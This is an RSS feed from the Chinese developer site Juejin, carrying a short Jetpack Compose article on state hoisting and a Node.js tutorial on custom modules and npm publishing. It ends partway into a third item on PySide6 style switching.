<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[Compose 提升状态的场景]]></title>    <link>https://juejin.cn/post/7581412054903242761</link>    <guid>https://juejin.cn/post/7581412054903242761</guid>    <pubDate>2025-12-09T04:08:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412054903242761" data-draft-id="7581619505584357427" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Compose 提升状态的场景"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2025-12-09T04:08:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Best_Jerry"/> <meta itemprop="url" content="https://juejin.cn/user/1099167360106999"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Compose 提升状态的场景
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1099167360106999/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Best_Jerry
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:08:35.000Z" title="Tue Dec 09 2025 04:08:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><a href="https://link.juejin.cn?target=https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DhWwZ_AuSGfo" target="_blank" title="https://www.youtube.com/watch?v=hWwZ_AuSGfo" ref="nofollow noopener noreferrer">Where to hoist that state in Compose?</a>
了解在 Jetpack Compose 中提升状态的方式和场景。</p>
<h2 data-id="heading-0">1. Composable functions</h2>
<p>点击 Message 展示消息时间。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2aa18c47d70347efa451f2bf213a8bca~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=39q65%2FocCVlPYJ6ebuuJ%2BVxBeTA%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/87a7e5044b254d06b4620e200782e1a2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=XwO6HQ9PBpBxyFLj6rmqcIIxuew%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-1">Not hoisting is a valid option.</h3>
<p>这个 UI 逻辑例子不需要提升状态。</p>
<h2 data-id="heading-2">2. State hoisting</h2>
<p>在下面的例子中，消息列表的状态需要提升。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/09febab1d1054ad98ea3af6954ea0db2~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=ifvc%2FpgVqAjVz1R97JP%2FrVMfUbw%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ab1fd642468e4bfba445b4bf6fc48ecf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=KpmIED66oQI3RklqGc9G%2BRvZ9z4%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d66ca43a293e4914a93cc0ea5b018fe8~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=i%2BWhx6VDxPZn0nqW1hTj1G6He6U%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/97d0195e029149e6bc023a7953c698d4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=TyvNtxMpEssqPtuzBGYXWLtLpQE%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/0f93e970635545dd9803889c7916d6ff~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=vSUshFKx%2FR%2FfKiu1VSEwSgjaFB0%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/52cdc9a7deca4bf48b87e6520469ca47~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=UDDXMsvlBlC1VFEAm3MMtCSE86E%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-3">Place state in the lowest common ancestor.</h3>
<h2 data-id="heading-4">3. Plain state holder class</h2>
<p>使用 state holder class 做状态提升，例如 LazyListState。
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/96b782f8acc34a31bde8a06c7c950d84~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=QzxOR0hJA%2BjJovN6wfKqr3rNUmo%3D" alt="image.png" loading="lazy"/></p>
<p>LazyListState 抽象了 scrollPosition 同时暴露了应用逻辑的方法，比如 scrollToItem()、scroll()、animateScrollToItem()。</p>
<h2 data-id="heading-5">4. Android architecture Components（AAC）ViewModel</h2>
<p>使用 ViewModel 做状态提升。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b4948223ccdc475aa2cd7d747191bfe0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=52Vm7QD2O1hrUFQ%2FVFIA%2FNvkf6w%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/94e671802e764757b6c000793cc89d90~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=U44a5ZmvTcRWlM16WO8a53mZ4Rc%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3035f0fa00ed44019183000d596d4a70~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=7t%2ByBzB6ojKxY0gnVVWkhcMnpMc%3D" alt="image.png" loading="lazy"/></p>
<h2 data-id="heading-6">5. Recap</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2c783a099ed54d1f81d56ad4d1556392~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=NO4pwuuyEmet%2FcedyPQSFkUrGqI%3D" alt="image.png" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2db75c5f2d3445e49ae1a772bd8db3b5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgQmVzdF9KZXJyeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765858115&amp;x-signature=VbuYRdWmW62bIeR0SvlQ0PfF5i0%3D" alt="image.png" loading="lazy"/></p>
<h3 data-id="heading-7">Keep state as low as possible.</h3></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Node.js 编程实战：自定义模块与包发布全流程解析]]></title>    <link>https://juejin.cn/post/7581412054902980617</link>    <guid>https://juejin.cn/post/7581412054902980617</guid>    <pubDate>2025-12-09T03:40:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581412054902980617" data-draft-id="7581412054902423561" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Node.js 编程实战：自定义模块与包发布全流程解析"/> <meta itemprop="keywords" content="后端,Node.js,Trae"/> <meta itemprop="datePublished" content="2025-12-09T03:40:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="程序员爱钓鱼"/> <meta itemprop="url" content="https://juejin.cn/user/2799775299157614"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Node.js 编程实战：自定义模块与包发布全流程解析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2799775299157614/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    程序员爱钓鱼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:40:31.000Z" title="Tue Dec 09 2025 03:40:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>在使用 Node.js 开发应用时，将代码拆分成可复用的模块是一项基本能力。但真正的工程化实践，不止是“写模块”这么简单，还包括如何规范结构、如何发布到 npm、如何让别人能够顺畅地安装和使用。在本文中，我们将从最基础的自定义模块开始，逐步深入到完整的 npm 包发布流程，帮助你掌握一条完整的从本地代码到线上开源的路径。</p>
</blockquote>
<hr/>
<h2 data-id="heading-0">一、自定义模块的基本形式</h2>
<p>Node.js 默认支持 CommonJS 模块规范，因此创建模块非常简单。只需要创建一个 <code>.js</code> 文件，通过 <code>module.exports</code> 或 <code>exports</code> 暴露功能即可。</p>
<h3 data-id="heading-1">1. 定义模块</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-comment">// math.js</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">a, b</span>) {
  <span class="hljs-keyword">return</span> a + b;
}

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  add
};
</code></pre>
<h3 data-id="heading-2">2. 引入模块</h3>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./math'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(math.<span class="hljs-title function_">add</span>(<span class="hljs-number">1</span>, <span class="hljs-number">2</span>)); <span class="hljs-comment">// 3</span>
</code></pre>
<p>通过这种方式，你就能将功能拆分到不同文件，保持代码清晰可维护。</p>
<hr/>
<h2 data-id="heading-3">二、模块组织结构设计</h2>
<p>随着项目增大，模块会不断增加，因此你需要为模块设计结构，让使用者能够一眼理解逻辑。</p>
<p>常见结构如下：</p>
<pre><code class="hljs language-lua" lang="lua">my-lib/
 ├── src/
 │    ├── index.js
 │    ├── <span class="hljs-built_in">math</span>.js
 │    └── tools.js
 ├── <span class="hljs-built_in">package</span>.json
 ├── README.md
 └── LICENSE
</code></pre>
<p><code>index.js</code> 通常作为主入口，将内部模块进行统一导出：</p>
<pre><code class="hljs language-js" lang="js"><span class="hljs-keyword">const</span> math = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./math'</span>);
<span class="hljs-keyword">const</span> tools = <span class="hljs-built_in">require</span>(<span class="hljs-string">'./tools'</span>);

<span class="hljs-variable language_">module</span>.<span class="hljs-property">exports</span> = {
  ...math,
  ...tools
};
</code></pre>
<p>这样使用者就只需要引入一处入口即可。</p>
<hr/>
<h2 data-id="heading-4">三、初始化 npm 包</h2>
<p>要将模块变成可安装的 npm 包，需要先创建 <code>package.json</code>。</p>
<p>在项目根目录执行：</p>
<pre><code class="hljs language-bash" lang="bash">npm init -y
</code></pre>
<p>它会自动生成一个最基础的 <code>package.json</code>：</p>
<pre><code class="hljs language-json" lang="json"><span class="hljs-punctuation">{</span>
  <span class="hljs-attr">"name"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"my-lib"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"version"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"1.0.0"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"main"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"src/index.js"</span><span class="hljs-punctuation">,</span>
  <span class="hljs-attr">"license"</span><span class="hljs-punctuation">:</span> <span class="hljs-string">"MIT"</span>
<span class="hljs-punctuation">}</span>
</code></pre>
<p>你可以根据需要补充描述、关键字、作者信息等。</p>
<hr/>
<h2 data-id="heading-5">四、发布前的重要准备</h2>
<p>在发布包之前，你需要确认以下内容已经完备：</p>
<h3 data-id="heading-6">1. README 文档清晰</h3>
<p>包含使用方法、API、示例等，让用户了解你的包能做什么。</p>
<h3 data-id="heading-7">2. LICENSE 许可协议</h3>
<p>开源必须明确授权，否则用户无法确定使用边界。</p>
<h3 data-id="heading-8">3. <code>.npmignore</code> 文件</h3>
<p>用于排除无需发布的文件，例如测试、文档、临时文件等。</p>
<p>例子：</p>
<pre><code class="hljs language-bash" lang="bash">node_modules/
<span class="hljs-built_in">test</span>/
docs/
*.<span class="hljs-built_in">log</span>
</code></pre>
<p>如果没有 <code>.npmignore</code>，npm 会参考 <code>.gitignore</code>。</p>
<hr/>
<h2 data-id="heading-9">五、发布 npm 包的完整流程</h2>
<h3 data-id="heading-10">1. 登录 npm 账号</h3>
<p>确保你已经在 npm 官网注册账户，然后在终端执行：</p>
<pre><code class="hljs language-bash" lang="bash">npm login
</code></pre>
<p>输入用户名、密码、邮箱后即可登录。</p>
<h3 data-id="heading-11">2. 版本号递增</h3>
<p>npm 强制要求每次发布都必须提升版本号：</p>
<pre><code class="hljs language-bash" lang="bash">npm version patch
</code></pre>
<p>常见语义化版本规则：</p>
<ul>
<li><code>patch</code>：修复 Bug</li>
<li><code>minor</code>：新增功能但不破坏兼容性</li>
<li><code>major</code>：破坏性更新</li>
</ul>
<h3 data-id="heading-12">3. 正式发布</h3>
<pre><code class="hljs language-bash" lang="bash">npm publish
</code></pre>
<p>如果你的是作用域包并默认私有，需要加上：</p>
<pre><code class="hljs language-bash" lang="bash">npm publish --access public
</code></pre>
<p>发布成功后，你的包就可以被任何开发者通过以下方式安装：</p>
<pre><code class="hljs language-bash" lang="bash">npm install my-lib
</code></pre>
<hr/>
<h2 data-id="heading-13">六、更新与维护包</h2>
<p>发布之后的维护同样重要，你可以：</p>
<ul>
<li>修复问题后再次发布新版本</li>
<li>添加更多 API</li>
<li>优化文档</li>
<li>使用 GitHub Issues 跟踪反馈</li>
</ul>
<p>包是长期发展的，良好的维护能让它更受欢迎。</p>
<hr/>
<h2 data-id="heading-14">七、总结</h2>
<p>自定义模块是 Node.js 中最基础也最关键的部分，而包发布则是 Node.js 生态中最具工程价值的能力。通过掌握从模块拆分、结构设计，到 npm 发布的完整流程，你能够让自己的代码真正进入生态、被更多开发者使用，这也是开源精神的重要体现。</p>
<p>如果你正在构建项目，建议从一个简单的工具包开始练习，把你的常用函数、工具类封装出来，再尝试发布到 npm，这将是一次非常有价值的学习过程。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[在PySide6/PyQt6的项目中实现样式切换处理]]></title>    <link>https://juejin.cn/post/7581478953866575872</link>    <guid>https://juejin.cn/post/7581478953866575872</guid>    <pubDate>2025-12-09T04:19:25.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581478953866575872" data-draft-id="7581437632854294568" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="在PySide6/PyQt6的项目中实现样式切换处理"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2025-12-09T04:19:25.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="伍华聪"/> <meta itemprop="url" content="https://juejin.cn/user/122769398839592"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta 